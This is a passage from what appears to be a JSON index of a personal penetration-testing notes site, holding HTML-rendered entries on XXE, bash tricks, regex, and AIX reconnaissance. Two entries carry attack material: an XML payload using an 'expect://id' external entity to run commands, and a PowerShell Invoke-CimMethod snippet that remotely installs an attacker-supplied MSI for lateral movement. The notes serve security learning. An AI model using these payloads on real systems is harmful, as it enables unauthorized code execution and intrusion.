32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; via &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/XXE-attacks&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/XXE-attacks&quot;&gt;XXE&lt;/a&gt;.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;xml&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;xml&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;?&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;xml&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; version&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;1.0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;!&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;DOCTYPE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; root&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; [&amp;#x3C;!&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;ENTITY&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; xxerce&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; SYSTEM &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;expect://id&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;]&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;root&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&amp;#x26;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;xxerce&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&amp;#x3C;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;root&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Don’t expect to run into this often however, as this combination of factors is pretty rare.&lt;/p&gt;"},"spells/Read-a-file-beginning-with-a-dash":{"slug":"spells/Read-a-file-beginning-with-a-dash","filePath":"spells/Read a file beginning with a dash.md","title":"Read a file beginning with a dash (-)","links":[],"tags":["Language/Bash","HowTo","Application/cat"],"content":"The easiest way to read a file beginning with a dash (-) is generally just to prefix it with a path; so, cat ./- reads a file called - in the current directory (as opposed to cat -, which tries to read from STDIN).","richContent":"&lt;p&gt;The easiest way to read a file beginning with a dash (-) is generally just to prefix it with a path; so, &lt;code&gt;cat ./-&lt;/code&gt; reads a file called &lt;code&gt;-&lt;/code&gt; in the current directory (as opposed to &lt;code&gt;cat -&lt;/code&gt;, which tries to read from STDIN).&lt;/p&gt;"},"spells/RegEx-metacharacters":{"slug":"spells/RegEx-metacharacters","filePath":"spells/RegEx metacharacters.md","title":"RegEx metacharacters","links":[],"tags":["Standard/RegEx"],"content":"\n\\d — [0-9]\n\\D — [^0-9]\n\\w — [0-9a-zA-Z_]\n\\W — [^0-9a-zA-Z_]\n\\s — Whitespace characters (including line breaks)\n\\S — Non-whitespace characters\n\n\n\n                  \n                  Important\n                  \n                \n\n\nBe aware that \\w includes _ (but not -)!\n\n\n","richContent":"&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;\\d&lt;/code&gt; — &lt;code&gt;[0-9]&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;\\D&lt;/code&gt; — &lt;code&gt;[^0-9]&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;\\w&lt;/code&gt; — &lt;code&gt;[0-9a-zA-Z_]&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;\\W&lt;/code&gt; — &lt;code&gt;[^0-9a-zA-Z_]&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;\\s&lt;/code&gt; — Whitespace characters (including line breaks)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;\\S&lt;/code&gt; — Non-whitespace characters&lt;/li&gt;\n&lt;/ul&gt;\n&lt;blockquote class=&quot;callout important&quot; data-callout=&quot;important&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Important&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Be aware that &lt;code&gt;\\w&lt;/code&gt; &lt;em&gt;includes&lt;/em&gt; &lt;code&gt;_&lt;/code&gt; (but not &lt;code&gt;-&lt;/code&gt;)!&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;"},"spells/Remotely-install-a-Windows-package-with-PowerShell":{"slug":"spells/Remotely-install-a-Windows-package-with-PowerShell","filePath":"spells/Remotely install a Windows package with PowerShell.md","title":"Remotely install a Windows package with PowerShell","links":[],"tags":["HowTo","OS/Windows","Application/PowerShell","AttackCycle/LateralMovement","AttackCycle/Exploitation"],"content":"Invoke-CimMethod -CimSession $SESSION_OBJECT `\n                 -ClassName Win32_Product `\n                 -MethodName Install `\n                 -Arguments @{\n                    PackageLocation = &quot;$PATH_TO_ATTACKER_MSI&quot;;\n                    Options = &quot;&quot;;\n                    AllUsers = $false\n                  }","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Invoke-CimMethod&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;CimSession &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SESSION_OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                 -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;ClassName Win32_Product &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;`&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                 -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;MethodName Install &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;`&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                 -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Arguments &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;@&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;{&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;                    PackageLocation&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;PATH_TO_ATTACKER_MSI&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;                    Options&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;                    AllUsers&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;false&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                  }&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Remove-duplicate-lines-in-Bash":{"slug":"spells/Remove-duplicate-lines-in-Bash","filePath":"spells/Remove duplicate lines in Bash.md","title":"Remove duplicate lines in Bash","links":[],"tags":["Language/Bash","HowTo"],"content":"Quick-and-dirty\ncat $FILE | sort -u\nThis works in a pinch, but as a side effect will sort the lines lexicographically. Avoiding a sort is possible but more complex…\nRemove all but the first occurrence of a line\ncat $FILE | cat -n | sort -uk2 | sort -nk1 | cut -f2-\nRemove all but the last occurrence of a line\ncat $FILE | cat -n | sort -rk2 | sort -uk2 | sort -nk1 | cut -f2-","richContent":"&lt;h2 id=&quot;quick-and-dirty&quot;&gt;Quick-and-dirty&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#quick-and-dirty&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;cat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; sort&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -u&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This works in a pinch, but as a side effect will sort the lines lexicographically. Avoiding a sort is possible &lt;a href=&quot;https://stackoverflow.com/questions/11532157/remove-duplicate-lines-without-sorting/20639730#20639730&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;but more complex&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;…&lt;/p&gt;\n&lt;h2 id=&quot;remove-all-but-the-first-occurrence-of-a-line&quot;&gt;Remove all but the first occurrence of a line&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#remove-all-but-the-first-occurrence-of-a-line&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;cat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; cat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; sort&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -uk2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; sort&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -nk1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; cut&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -f2-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;remove-all-but-the-last-occurrence-of-a-line&quot;&gt;Remove all but the last occurrence of a line&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#remove-all-but-the-last-occurrence-of-a-line&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;cat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; cat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; sort&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -rk2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; sort&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -uk2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; sort&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -nk1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; cut&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -f2-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Retrieve-AIX-fileset-information":{"slug":"spells/Retrieve-AIX-fileset-information","filePath":"spells/Retrieve AIX fileset information.md","title":"Retrieve AIX fileset information","links":["spells/Match-files-to-packages-in-Red-Hat-based-operating-systems"],"tags":["OS/AIX","HowTo","Application/lslpp","AttackCycle/Reconnaissance"],"content":"Use the lslpp command to get information about a given fileset (including installed files).\nlslpp -l               # List all filesets\nlslpp -h $FILESET_NAME # Detailed fileset information\nSome versions of AIX can also apparently use the RPM package manager.\nTransclude of Match-files-to-packages-in-Red-Hat-based-operating-systems","richContent":"&lt;p&gt;Use the &lt;a href=&quot;https://www.ibm.com/docs/en/aix/7.2?topic=l-lslpp-command&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;lslpp&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; command to get information about a given fileset (including installed files).&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;lslpp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -l&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;               # List all filesets&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;lslpp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -h&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $FILESET_NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # Detailed fileset information&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Some versions of AIX can also apparently use the RPM package manager.&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Match-files-to-packages-in-Red-Hat-based-operating-systems&quot; data-block=&quot;&quot; data-embed-alias=&quot;Match files to packages in Red Hat-based operating systems&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Match-files-to-packages-in-Red-Hat-based-operating-systems&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Match-files-to-packages-in-Red-Hat-based-operating-systems&quot;&gt;Transclude of Match-files-to-packages-in-Red-Hat-based-operating-systems&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;"},"spells/Retrieve-AIX-system-information":{"slug":"spells/Retrieve-AIX-system-information","filePath":"spells/Retrieve AIX system information.md","title":"Retrieve AIX system information","links":[],"tags":["OS/AIX","HowTo","Application/oslevel","AttackCycle/Reconnaissance"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\nAdapted from slyth11907 / Cheatsheets / Cheatsheet_AIXBuild.txt.\n\n\n\noslevel     # Report system version\noslevel -rq # Report &quot;technology level&quot; (major release?)\n            # information\noslevel -sq # Report service pack information\nDifferent system components (“filesets”) can be at different technology levels / service packs. You can use oslevel to list which software that is more (-g) or less (-l) recent than a given technology level (-r) or service pack (-s); for example:\noslevel -s -l $SERVICE_PACK # List filesets below the\n                            # specified service pack","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Adapted from &lt;a href=&quot;https://github.com/slyth11907/Cheatsheets/blob/master/Cheatsheet_AIXBuild.txt&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;slyth11907 / Cheatsheets / Cheatsheet_AIXBuild.txt&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;oslevel&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;     # Report system version&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;oslevel&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -rq&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # Report &quot;technology level&quot; (major release?)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;            # information&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;oslevel&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -sq&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # Report service pack information&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Different system components (“filesets”) can be at different technology levels / service packs. You can use &lt;a href=&quot;https://www.ibm.com/docs/en/aix/7.2?topic=o-oslevel-command&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;oslevel&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; to list which software that is more (&lt;code&gt;-g&lt;/code&gt;) or less (&lt;code&gt;-l&lt;/code&gt;) recent than a given technology level (&lt;code&gt;-r&lt;/code&gt;) or service pack (&lt;code&gt;-s&lt;/code&gt;); for example:&lt;/p&gt;\n&lt;figure 